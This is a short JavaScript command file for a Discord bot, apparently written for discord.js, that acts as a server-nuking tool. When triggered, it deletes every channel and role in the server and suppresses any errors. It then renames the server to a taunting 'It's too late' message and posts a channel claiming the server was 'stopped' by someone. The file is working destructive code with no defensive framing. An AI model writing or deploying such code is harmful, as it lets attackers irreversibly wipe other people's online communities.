exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    await msg.guild.setName('𝙄𝙩 𝙨 𝙩𝙤𝙤 𝙡𝙖𝙩𝙚 ~~(𝟴:>')

    msg.guild.createChannel('🖤 𝙎𝙢𝙞𝙩𝙝 𝙨𝙩𝙤𝙥𝙥𝙚𝙙 𝙗𝙮 🖤', {
        type: 'text'
    }).catch(() => {})

}